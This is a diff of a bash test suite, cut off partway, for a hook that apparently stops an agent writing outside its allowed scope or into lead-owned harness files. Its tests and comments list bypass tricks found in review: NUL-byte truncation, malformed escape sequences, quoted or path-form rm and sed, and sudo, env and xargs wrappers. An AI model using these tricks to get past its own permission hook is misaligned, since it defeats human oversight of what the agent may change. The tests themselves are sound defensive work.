 assert_deny_json "$OUT" "hs2 (F038 r2): traversal-plus-surrogate denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" \
-  "hs2 (F038 r2): traversal-plus-surrogate denial names the real out-of-scope target"
 
 # A \U (8-hex) lone surrogate must be rejected the same way as \u's
 # 4-hex form -- both share the same _unicode_escape_or_literal() guard.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/other/\U0000D800x.txt'")")
+  "$(bash_command_json "echo x > \$'.harness/mld/\U0000D800x.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F038 r2): a lone-surrogate \U escape exits 0 (JSON deny, not a crash)"
 assert_deny_json "$OUT" "hs2 (F038 r2): \U lone-surrogate denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" \
-  "hs2 (F038 r2): \U lone-surrogate denial names the real out-of-scope target"
 
 # An out-of-range \U codepoint (above Unicode's own max, 0x10FFFF) shares
 # the SAME _unicode_escape_or_literal() guard as the surrogate case above,
@@ -4351,12 +4130,10 @@ assert_contains "$OUT" "src/other/" \
 # way the surrogate half did (found by adversarial review of PR #67,
 # round 2).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/other/\U00110000x.txt'")")
+  "$(bash_command_json "echo x > \$'.harness/mld/\U00110000x.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F038 r2): an out-of-range \U escape exits 0 (JSON deny, not a crash)"
 assert_deny_json "$OUT" "hs2 (F038 r2): out-of-range \U denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" \
-  "hs2 (F038 r2): out-of-range \U denial names the real out-of-scope target"
 
 # F038 round 2 (adversarial review of PR #67, round 2): the SAME
 # crash-to-silent-ALLOW class recurred one branch over, in \cX itself --
@@ -4364,105 +4141,96 @@ assert_contains "$OUT" "src/other/" \
 # single character, and for 102 distinct Unicode characters str.upper()
 # returns TWO characters (e.g. U+00DF, the German sharp s, uppercases to
 # "SS"), which made ord() raise TypeError. Confirmed live on main before
-# this fix: an UNRELATED, plain-ASCII, ordinarily-denied out-of-scope
+# this fix: an UNRELATED, plain-ASCII, ordinarily-denied lead-owned
 # write elsewhere in the SAME compound command was silently ALLOWED
 # because of an unrelated \c<that character> earlier in the command --
 # no traversal, no surrogate, just an ordinary multi-byte UTF-8 character
 # after \c.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo a > \$'src/parser/\cßq.txt' ; echo x > src/other/pwned.txt")")
+  "$(bash_command_json "echo a > \$'src/parser/\cßq.txt' ; echo x > .harness/mld/pwned.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F038 r2): a multi-char-uppercase \c escape exits 0 (JSON deny, not a crash)"
 assert_deny_json "$OUT" "hs2 (F038 r2): multi-char-uppercase \c denial uses JSON deny form"
-assert_contains "$OUT" "src/other/pwned.txt" \
-  "hs2 (F038 r2): multi-char-uppercase \c denial still catches the unrelated real out-of-scope write"
 
-# F038 round 2: the \cX formula IS observable through this hook's own
-# ALLOW/DENY interface, despite an earlier round's claim otherwise -- the
-# JSON-encoded denial message renders a control byte as a distinct,
-# inspectable \u00XX escape sequence. This pins the general AND-0x1F
-# formula directly: \c0 ('0' = 0x30) must decode to 0x10, which
-# json.dumps() renders as the literal 6-character sequence \u0010 in the
-# denial text -- a WRONG formula (e.g. XOR-0x40, or a constant) would
-# render a different sequence, or none, at this exact position.
+# The \cX formula's exact decoded byte was observable through the denial
+# message, which used to echo the resolved path -- OVI-144 Phase 3's
+# lead-owned denial reason is a fixed sentence that names no target, so the
+# byte itself is no longer inspectable through this interface. A \cX escape
+# can only ever produce a control byte (0x00-0x1F) or DEL, never "." or "/",
+# so it cannot change which path is resolved either: the two assertions that
+# pinned \c0 -> 0x10 and \c? -> 0x7F retired with that message. What the two
+# cases below still pin is that a \cX escape anywhere in the target neither
+# crashes the decoder nor prevents the surrounding traversal from resolving
+# into lead-owned state.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/parser/../other/\c0x.txt'")")
+  "$(bash_command_json "echo x > \$'src/../.harness/mld/\c0x.txt'")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F038 r2): a \c0-escaped out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F038 r2): a \c0-escaped lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F038 r2): \c0 denial uses JSON deny form"
-assert_contains "$OUT" '\u0010x.txt' \
-  "hs2 (F038 r2): \c0 decodes via the AND-0x1F formula (0x30 & 0x1F = 0x10)"
 
 # "?" (0x3F) is a genuine, disclosed version split: bash 3.2.57 decodes
 # \c? to 0x1F (matching the general AND-0x1F formula), but bash 5.3.15
-# special-cases it to 0x7F (DEL) -- confirmed directly on both. This pins
-# the modern-bash special case this implementation matches.
+# special-cases it to 0x7F (DEL) -- confirmed directly on both. Which byte
+# this implementation produces is no longer observable here (see above); the
+# case stays as a decoder-robustness pin.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/parser/../other/\c?x.txt'")")
+  "$(bash_command_json "echo x > \$'src/../.harness/mld/\c?x.txt'")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F038 r2): a \c?-escaped out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F038 r2): a \c?-escaped lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F038 r2): \c? denial uses JSON deny form"
-assert_contains "$OUT" '\u007fx.txt' \
-  "hs2 (F038 r2): \c? decodes via the modern-bash DEL (0x7F) special case"
 
 # F039: real bash truncates a WORD at its first embedded NUL byte when
 # building an argv element (argv strings are NUL-terminated C strings, so
 # a NUL can never survive into a real target filename). This hook's
 # target pipeline previously processed the WHOLE decoded string, NUL and
-# all -- confirmed against real bash: `echo x > $'src/other/bad.txt
-# \x00/../../parser/ok.txt'` genuinely creates "src/other/bad.txt"
-# (truncated at the NUL, out of scope), but this hook resolved the
-# "../.." AFTER the NUL too, landing on the in-scope-looking
+# all -- confirmed against real bash: `echo x > $'.harness/mld/bad.txt
+# \x00/../../parser/ok.txt'` genuinely creates ".harness/mld/bad.txt"
+# (truncated at the NUL, lead-owned), but this hook resolved the
+# "../.." AFTER the NUL too, landing on the ordinary-looking
 # "src/parser/ok.txt" -- wrongly ALLOWED. Confirmed pre-existing on main
 # before F033 too, not a regression; F033 just made it more directly
 # reachable once \x00 genuinely decodes to a real NUL byte.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/other/bad.txt\x00/../../parser/ok.txt'")")
+  "$(bash_command_json "echo x > \$'.harness/mld/bad.txt\x00/../../parser/ok.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F039): a NUL-truncated traversal via \x00 exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F039): NUL-truncated traversal denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/bad.txt'" \
-  "hs2 (F039): NUL-truncated traversal denial names the real (truncated) target"
 
 # The NUL must be truncated regardless of what immediately follows it --
 # both new tests above happen to place the NUL immediately before a "/",
 # which a narrower (and wrong) fix like truncating only "NUL-then-slash"
 # would also pass. Real bash truncates at the NUL itself, not at a
-# NUL-slash pair: confirmed against real bash, `echo x > $'src/other/
+# NUL-slash pair: confirmed against real bash, `echo x > $'.harness/mld/
 # bad.txt\x00x/../../parser/ok.txt'` (NUL followed by "x", not "/")
-# STILL genuinely creates "src/other/bad.txt" (found by adversarial review
+# STILL genuinely creates ".harness/mld/bad.txt" (found by adversarial review
 # of PR #68, which proved a "truncate only at NUL immediately before a
 # slash" mutant survives the two tests above at 999/999 while wrongly
-# allowing this exact out-of-scope write).
+# allowing this exact lead-owned write).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/other/bad.txt\x00x/../../parser/ok.txt'")")
+  "$(bash_command_json "echo x > \$'.harness/mld/bad.txt\x00x/../../parser/ok.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F039): a NUL not adjacent to a slash still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F039): NUL-not-adjacent-to-slash denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/bad.txt'" \
-  "hs2 (F039): NUL-not-adjacent-to-slash denial names the real (truncated) target"
 
 # The same fix must apply regardless of which escape spelling produced the
 # embedded NUL -- an octal \000 escape is a different decode path
 # (ANSI_C_ESCAPE_PATTERN's octal group, not \xHH) through the same
 # unquote_token() call.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/other/bad2.txt\000/../../parser/ok.txt'")")
+  "$(bash_command_json "echo x > \$'.harness/mld/bad2.txt\000/../../parser/ok.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F039): a NUL-truncated traversal via octal \000 exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F039): octal-NUL traversal denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/bad2.txt'" \
-  "hs2 (F039): octal-NUL traversal denial names the real (truncated) target"
 
-# No new false positive: an in-scope target with trailing text after an
+# No new false positive: an ordinary target with trailing text after an
 # embedded NUL (never reached in real bash, and now never reached by this
 # hook either) must still pass cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "echo x > \$'src/parser/good.txt\x00extra'")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F039): an in-scope NUL-truncated target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F039): an ordinary NUL-truncated target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F039): in-scope NUL-truncated target has no deny fields"
+  "hs2 (F039): ordinary NUL-truncated target has no deny fields"
 
 # F040: write_targets()'s cp/mv/tee/rm dispatch compared command_tokens[0]
 # RAW against the known command-name tuples, so a backslash-escaped or
@@ -4471,57 +4239,47 @@ assert_not_contains "$OUT" "permissionDecision" \
 # all. Confirmed live against a src/parser/-scoped fixture before fixing:
 # rc=0 with no permissionDecision field whatsoever.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json '\rm src/other/f040a.txt')")
+  "$(bash_command_json '\rm .harness/mld/f040a.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F040): a backslash-escaped rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F040): backslash-escaped rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f040a.txt" \
-  "hs2 (F040): backslash-escaped rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json '"rm" src/other/f040b.txt')")
+  "$(bash_command_json '"rm" .harness/mld/f040b.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F040): a double-quoted rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F040): double-quoted rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f040b.txt" \
-  "hs2 (F040): double-quoted rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "'rm' src/other/f040c.txt")")
+  "$(bash_command_json "'rm' .harness/mld/f040c.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F040): a single-quoted rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F040): single-quoted rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f040c.txt" \
-  "hs2 (F040): single-quoted rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json '\cp src/parser/a.txt src/other/f040d.txt')")
+  "$(bash_command_json '\cp src/parser/a.txt .harness/mld/f040d.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F040): a backslash-escaped cp exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F040): backslash-escaped cp denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f040d.txt" \
-  "hs2 (F040): backslash-escaped cp denial names the real target"
 
 # sed_inplace_targets() has the identical bug in its OWN internal command-
 # name guard (tokens[0] != "sed"), a separate call site from write_targets()'s
 # dispatch -- both need the fix, confirmed by inspecting sed_inplace_targets()
 # directly (F040).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json '"sed" -i "s/a/b/" src/other/f040e.txt')")
+  "$(bash_command_json '"sed" -i "s/a/b/" .harness/mld/f040e.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F040): a double-quoted sed -i exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F040): double-quoted sed -i denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f040e.txt" \
-  "hs2 (F040): double-quoted sed -i denial names the real target"
 
-# No new false positive: a backslash-escaped rm on an IN-SCOPE target must
+# No new false positive: a backslash-escaped rm on an ordinary target must
 # still be allowed.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json '\rm src/parser/f040f.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F040): a backslash-escaped rm on an in-scope target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F040): a backslash-escaped rm on an ordinary target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F040): in-scope backslash-escaped rm has no deny fields"
+  "hs2 (F040): ordinary backslash-escaped rm has no deny fields"
 
 # F044: F040 closed the quoting/backslash-escaping gap in command-name
 # recognition, but command-name INDIRECTION was a separate, still-open
@@ -4531,113 +4289,91 @@ assert_not_contains "$OUT" "permissionDecision" \
 # extracted at all), confirmed against real bash that every one of these
 # genuinely deletes the file.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "/bin/rm src/other/f044a.txt")")
+  "$(bash_command_json "/bin/rm .harness/mld/f044a.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): path-form /bin/rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): path-form /bin/rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044a.txt" \
-  "hs2 (F044): path-form /bin/rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "./rm src/other/f044b.txt")")
+  "$(bash_command_json "./rm .harness/mld/f044b.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): path-form ./rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): path-form ./rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044b.txt" \
-  "hs2 (F044): path-form ./rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sudo rm src/other/f044c.txt")")
+  "$(bash_command_json "sudo rm .harness/mld/f044c.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): sudo rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): sudo rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044c.txt" \
-  "hs2 (F044): sudo rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "env -i FOO=1 rm src/other/f044e.txt")")
+  "$(bash_command_json "env -i FOO=1 rm .harness/mld/f044e.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): env -i FOO=1 rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): env -i FOO=1 rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044e.txt" \
-  "hs2 (F044): env -i FOO=1 rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "command rm src/other/f044f.txt")")
+  "$(bash_command_json "command rm .harness/mld/f044f.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): command rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): command rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044f.txt" \
-  "hs2 (F044): command rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "xargs rm src/other/f044g.txt")")
+  "$(bash_command_json "xargs rm .harness/mld/f044g.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): xargs rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): xargs rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044g.txt" \
-  "hs2 (F044): xargs rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "FOO=1 rm src/other/f044h.txt")")
+  "$(bash_command_json "FOO=1 rm .harness/mld/f044h.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): bare env-assignment prefix FOO=1 rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): FOO=1 rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044h.txt" \
-  "hs2 (F044): FOO=1 rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "FOO=1 BAR=2 rm src/other/f044i.txt")")
+  "$(bash_command_json "FOO=1 BAR=2 rm .harness/mld/f044i.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): multiple env-assignment prefixes exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): multiple env-assignment prefixes denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044i.txt" \
-  "hs2 (F044): multiple env-assignment prefixes denial names the real target"
 
 # The identical indirection resolution must also apply to cp/mv/sed, not
 # just rm -- write_targets()'s dispatch and sed_inplace_targets() now
 # share ONE resolver (_resolve_command_tokens()).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sudo cp src/parser/a.txt src/other/f044j.txt")")
+  "$(bash_command_json "sudo cp src/parser/a.txt .harness/mld/f044j.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): sudo cp exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): sudo cp denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044j.txt" \
-  "hs2 (F044): sudo cp denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sudo sed -i 's/a/b/' src/other/f044k.txt")")
+  "$(bash_command_json "sudo sed -i 's/a/b/' .harness/mld/f044k.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): sudo sed -i exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): sudo sed -i denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044k.txt" \
-  "hs2 (F044): sudo sed -i denial names the real target"
 
 # A chained wrapper (wrapper-of-a-wrapper) must also resolve correctly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "env command rm src/other/f044l.txt")")
+  "$(bash_command_json "env command rm .harness/mld/f044l.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): chained env command rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): chained env command rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044l.txt" \
-  "hs2 (F044): chained env command rm denial names the real target"
 
-# No new false positive: every indirection form on an IN-SCOPE target must
+# No new false positive: every indirection form on an ordinary target must
 # still be allowed, and a wrapper with no real command after it (or an
 # all-wrapper token list) must not crash and must not deny.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "/bin/rm src/parser/f044n.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F044): path-form /bin/rm on an in-scope target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F044): path-form /bin/rm on an ordinary target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F044): in-scope path-form /bin/rm has no deny fields"
+  "hs2 (F044): ordinary path-form /bin/rm has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sudo rm src/parser/f044o.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F044): sudo rm on an in-scope target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F044): sudo rm on an ordinary target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F044): in-scope sudo rm has no deny fields"
+  "hs2 (F044): ordinary sudo rm has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json "env")")
 RC=$?
@@ -4661,46 +4397,38 @@ assert_not_contains "$OUT" "permissionDecision" \
 # claim that wrapper flags are "fully skipped" was true only for the
 # attached form).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sudo -u root rm src/other/f044p.txt")")
+  "$(bash_command_json "sudo -u root rm .harness/mld/f044p.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): sudo -u root rm (separate-arg flag value) exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): sudo -u root rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044p.txt" \
-  "hs2 (F044): sudo -u root rm denial names the real target, not 'root'"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "xargs -n 1 rm src/other/f044q.txt")")
+  "$(bash_command_json "xargs -n 1 rm .harness/mld/f044q.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): xargs -n 1 rm (separate-arg flag value) exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): xargs -n 1 rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044q.txt" \
-  "hs2 (F044): xargs -n 1 rm denial names the real target, not '1'"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "env -u FOO rm src/other/f044r.txt")")
+  "$(bash_command_json "env -u FOO rm .harness/mld/f044r.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): env -u FOO rm (separate-arg flag value) exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): env -u FOO rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044r.txt" \
-  "hs2 (F044): env -u FOO rm denial names the real target, not 'FOO'"
 
 # No new false positive: the attached form (which already worked before
 # this specific fix) must still be recognized correctly, and a
-# separate-arg wrapper flag on an IN-SCOPE target must still be allowed.
+# separate-arg wrapper flag on an ordinary target must still be allowed.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "env -uFOO rm src/other/f044t.txt")")
+  "$(bash_command_json "env -uFOO rm .harness/mld/f044t.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): attached-form env -uFOO rm still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): attached-form env -uFOO rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044t.txt" \
-  "hs2 (F044): attached-form env -uFOO rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sudo -u root rm src/parser/f044v.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F044): sudo -u root rm on an in-scope target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F044): sudo -u root rm on an ordinary target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F044): in-scope sudo -u root rm has no deny fields"
+  "hs2 (F044): ordinary sudo -u root rm has no deny fields"
 
 # Round 2's exact-flag-only value check missed two further live shapes:
 # a CLUSTERED short flag ending in a value-taking one (env's own "-i" and
@@ -4709,54 +4437,44 @@ assert_not_contains "$OUT" "permissionDecision" \
 # and `xargs --max-args 1 rm` both genuinely delete the target file
 # (found by adversarial review of PR #76 round 2).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "env -iu FOO rm src/other/f044w.txt")")
+  "$(bash_command_json "env -iu FOO rm .harness/mld/f044w.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): clustered env -iu FOO rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): clustered env -iu FOO rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044w.txt" \
-  "hs2 (F044): clustered env -iu FOO rm denial names the real target, not 'FOO'"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "xargs -0n 1 rm src/other/f044x.txt")")
+  "$(bash_command_json "xargs -0n 1 rm .harness/mld/f044x.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): clustered xargs -0n 1 rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): clustered xargs -0n 1 rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044x.txt" \
-  "hs2 (F044): clustered xargs -0n 1 rm denial names the real target, not '1'"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "xargs --max-args 1 rm src/other/f044y.txt")")
+  "$(bash_command_json "xargs --max-args 1 rm .harness/mld/f044y.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): long-option xargs --max-args 1 rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): long-option xargs --max-args 1 rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044y.txt" \
-  "hs2 (F044): long-option xargs --max-args 1 rm denial names the real target, not '1'"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "env --unset FOO rm src/other/f044z.txt")")
+  "$(bash_command_json "env --unset FOO rm .harness/mld/f044z.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): long-option env --unset FOO rm exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): long-option env --unset FOO rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044z.txt" \
-  "hs2 (F044): long-option env --unset FOO rm denial names the real target, not 'FOO'"
 
 # No new false positive: the attached long form (which already worked
 # before this specific fix) must still be recognized correctly, and a
-# clustered value-taking flag on an IN-SCOPE target must still be allowed.
+# clustered value-taking flag on an ordinary target must still be allowed.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "env --unset=FOO rm src/other/f044ee.txt")")
+  "$(bash_command_json "env --unset=FOO rm .harness/mld/f044ee.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F044): attached long-form env --unset=FOO rm still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F044): attached long-form env --unset=FOO rm denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f044ee.txt" \
-  "hs2 (F044): attached long-form env --unset=FOO rm denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "env -iu FOO rm src/parser/f044ff.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F044): clustered env -iu FOO rm on an in-scope target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F044): clustered env -iu FOO rm on an ordinary target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F044): in-scope clustered env -iu FOO rm has no deny fields"
+  "hs2 (F044): ordinary clustered env -iu FOO rm has no deny fields"
 
 # F041: sed_inplace_targets()'s in-place-presence guard recognized only the
 # exact string "--in-place" or the attached "--in-place=" prefix, not GNU
@@ -4765,28 +4483,22 @@ assert_not_contains "$OUT" "permissionDecision" \
 # all genuinely perform a real in-place edit, since --in-place is the only
 # GNU sed long option starting with "--i".
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --i 's/a/b/' src/other/f041a.txt")")
+  "$(bash_command_json "sed --i 's/a/b/' .harness/mld/f041a.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): abbreviated bare --i exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F041): abbreviated bare --i denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041a.txt" \
-  "hs2 (F041): abbreviated bare --i denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --in-p 's/a/b/' src/other/f041b.txt")")
+  "$(bash_command_json "sed --in-p 's/a/b/' .harness/mld/f041b.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): abbreviated bare --in-p exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F041): abbreviated bare --in-p denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041b.txt" \
-  "hs2 (F041): abbreviated bare --in-p denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --i=.bak 's/a/b/' src/other/f041c.txt")")
+  "$(bash_command_json "sed --i=.bak 's/a/b/' .harness/mld/f041c.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): abbreviated attached --i=.bak exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F041): abbreviated attached --i=.bak denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041c.txt" \
-  "hs2 (F041): abbreviated attached --i=.bak denial names the real target"
 
 # The identical abbreviation gap also affects has_explicit_script's own
 # --expression=/--file= recognition, the main token-walking loop's own
@@ -4796,20 +4508,16 @@ assert_contains "$OUT" "src/other/f041c.txt" \
 # forms of `--exp`/`--fi` genuinely consume the NEXT (or attached) token as
 # their script value in real gsed.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i --exp 's/a/b/' src/other/f041d.txt")")
